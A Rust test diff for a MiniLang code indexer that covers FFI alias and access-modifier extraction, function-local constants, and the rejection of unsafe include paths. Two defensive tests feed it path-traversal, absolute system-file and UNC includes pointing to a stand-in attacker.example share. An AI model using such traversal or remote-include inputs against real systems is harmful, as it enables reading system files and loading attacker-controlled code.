@@ -582,12 +582,69 @@ End Unsafe
     let m = tick.metadata.as_ref().expect("metadata");
     assert_eq!(m.get("binding").map(String::as_str), Some("pinvoke"));
     assert_eq!(m.get("library").map(String::as_str), Some("kernel32.dll"));
+    // No `Alias` clause on this line -- the key must be ABSENT, not an
+    // empty string, so downstream consumers can distinguish "no alias"
+    // from "empty alias".
+    assert_eq!(m.get("alias"), None, "got metadata {m:?}");
 
     let slow = externs.iter().find(|s| s.name == "SlowOp").expect("SlowOp");
     let m = slow.metadata.as_ref().expect("metadata");
     assert_eq!(m.get("binding").map(String::as_str), Some("c_ffi"));
     assert_eq!(m.get("library").map(String::as_str), Some("mylib.dll"));
     assert_eq!(m.get("blocking").map(String::as_str), Some("true"));
+}
+
+#[test]
+fn ffi_alias_clause_is_recorded_when_present() {
+    // 171 corpus occurrences use this shape: `Declare Function Copy Lib
+    // "intrinsic" Alias "bytes_copy" (b As Bytes) As Bytes`.
+    let src = "\
+Unsafe(Ffi)
+    Declare Function Copy Lib \"intrinsic\" Alias \"bytes_copy\" (b As Bytes) As Bytes
+End Unsafe
+";
+    let (syms, _) = run(src);
+    let copy = syms
+        .iter()
+        .find(|s| s.kind == "extern_function" && s.name == "Copy")
+        .expect("Copy");
+    let m = copy.metadata.as_ref().expect("metadata");
+    assert_eq!(m.get("alias").map(String::as_str), Some("bytes_copy"));
+    assert_eq!(m.get("library").map(String::as_str), Some("intrinsic"));
+}
+
+#[test]
+fn public_declare_and_extern_ffi_bindings_are_still_extracted() {
+    // 4 real files carry `Public Declare Function ...` /
+    // `Public Extern "C" Function ...`. Neither `parse_ffi_binding` nor
+    // `parse_const` stripped a leading access modifier, so these lines
+    // silently produced no symbol at all.
+    let src = "\
+Unsafe(Ffi)
+    Public Declare Function GetTickCount Lib \"kernel32.dll\" () As Int
+    Public Extern \"C\" Function SlowOp Lib \"mylib.dll\" (x As Int) As Int
+End Unsafe
+";
+    let (syms, _) = run(src);
+    let externs: Vec<&engram_index::parsing::ExtractedSymbol> = syms
+        .iter()
+        .filter(|s| s.kind == "extern_function")
+        .collect();
+    assert_eq!(
+        externs.len(),
+        2,
+        "got {:?}",
+        externs.iter().map(|s| &s.name).collect::<Vec<_>>()
+    );
+    for e in &externs {
+        let m = e.metadata.as_ref().expect("metadata");
+        assert_eq!(
+            m.get("access").map(String::as_str),
+            Some("Public"),
+            "{}: got metadata {m:?}",
+            e.name
+        );
+    }
 }
 
 #[test]
@@ -609,5 +666,69 @@ End Namespace
             .and_then(|m| m.get("value"))
             .map(String::as_str),
         Some("5 * 2")
+    );
+}
+
+#[test]
+fn const_inside_a_function_body_is_not_promoted_to_a_symbol() {
+    // MiniLang allows a `Const` inside a function body for CTFE-friendly
+    // local declarations (real corpus file:
+    // `tests/conformance/generics/test_mlh2380_const_ctfe.ml`'s
+    // `Const LOCAL = 6 * 7`). It is local to the function's execution, not
+    // a project-level declaration, so it must never be promoted to a
+    // `constant` symbol under any enclosing scope.
+    let src = "\
+Namespace Demo
+    Function Compute() As Int
+        Const LOCAL = 6 * 7
+        Return LOCAL
+    End Function
+End Namespace
+";
+    let (syms, _) = run(src);
+    assert!(
+        !syms.iter().any(|s| s.kind == "constant"),
+        "Const inside a function body must not emit a constant symbol, got {:?}",
+        syms.iter().map(|s| (&s.kind, &s.name)).collect::<Vec<_>>()
+    );
+}
+
+#[test]
+fn include_that_escapes_the_project_root_emits_no_edge() {
+    // `tests/negative/includes/` in the target corpus exists precisely to
+    // prove the MiniLang compiler REJECTS root-escaping includes. Before
+    // the fix, `parts.pop()` on an empty Vec was a silent no-op, so extra
+    // leading `..`s were simply dropped, resolving to a plausible-looking
+    // but fabricated in-project target instead of no edge at all.
+    let src = "Include \"../../../../../../../../Windows/win.ini\"\n";
+    let (_, edges) = extract_ml(
+        Path::new("C:/proj/src/Libraries/Std.Collections.Typed.ml"),
+        "src/Libraries/Std.Collections.Typed.ml",
+        src,
+    );
+    assert!(
+        !edges.iter().any(|e| e.kind == "includes_file"),
+        "root-escaping include must not fabricate a project-relative edge, got {edges:?}"
+    );
+}
+
+#[test]
+fn include_of_an_absolute_or_unc_path_emits_no_edge() {
+    // Covers the drive-letter-absolute (also the alternate-data-stream
+    // shape, `C:\...:hidden`, which is textually indistinguishable from a
+    // plain absolute path at this parser's level) and UNC/device-namespace
+    // adversarial cases from `tests/negative/includes/`.
+    let src = "\
+Include \"C:\\Windows\\win.ini\"
+Include \"\\\\attacker.example\\share\\payload.ml\"
+";
+    let (_, edges) = extract_ml(
+        Path::new("C:/proj/src/Libraries/Std.Collections.Typed.ml"),
+        "src/Libraries/Std.Collections.Typed.ml",
+        src,
+    );
+    assert!(
+        !edges.iter().any(|e| e.kind == "includes_file"),
+        "absolute/UNC includes must not fabricate a project-relative edge, got {edges:?}"
     );
 }
